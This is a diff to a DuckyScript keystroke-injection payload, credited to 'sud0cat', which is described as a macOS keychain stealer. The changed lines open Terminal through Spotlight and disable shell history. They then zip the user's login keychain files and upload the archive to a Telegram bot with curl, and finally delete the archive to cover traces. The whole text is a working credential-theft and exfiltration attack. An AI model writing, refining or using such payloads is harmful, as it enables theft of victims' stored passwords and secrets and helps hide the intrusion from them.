@@ -4,23 +4,27 @@ REM Author: sud0cat
 REM Description: Keychain stealer that sends exfiltrated data to Telegram
 REM Target: macOS
 
-DEFAULT_DELAY 500
-
-REM Open the terminal
-F4
-STRING Terminal
+REM Open terminal
+GUI SPACE
+DELAY 1000
+STRING terminal
+DELAY 500
 ENTER
 
 REM Disable shell history
+DELAY 1000
 STRING unset HISTFILE
 ENTER
 
 REM Gather keychain data
-STRING ((bash -c cd ~/Library/Keychains/ && zip login.zip login.keychain* &>/dev/null &)&)
+STRING cd ~/Library/Keychains/
+ENTER
+STRING ((zip login.zip login.keychain* &>/dev/null &)&)
 ENTER
 
 REM Send files to Telegram channel + remove trace
-STRING ((curl -v -F "chat_id=<your_chat_id>" -F document=@login.zip https://api.telegram.org/bot<your_bot_id>/sendDocument && rm login.zip &>/dev/null &)&)
+STRING ((curl -v -F "chat_id=<your_chat_id>" -F document=@login.zip https://api.telegram.org/bot<your_bot_id>/sendDocument &>/dev/null && rm login.zip &)&) 
+DELAY 500
 ENTER
 
 REM Quit terminal
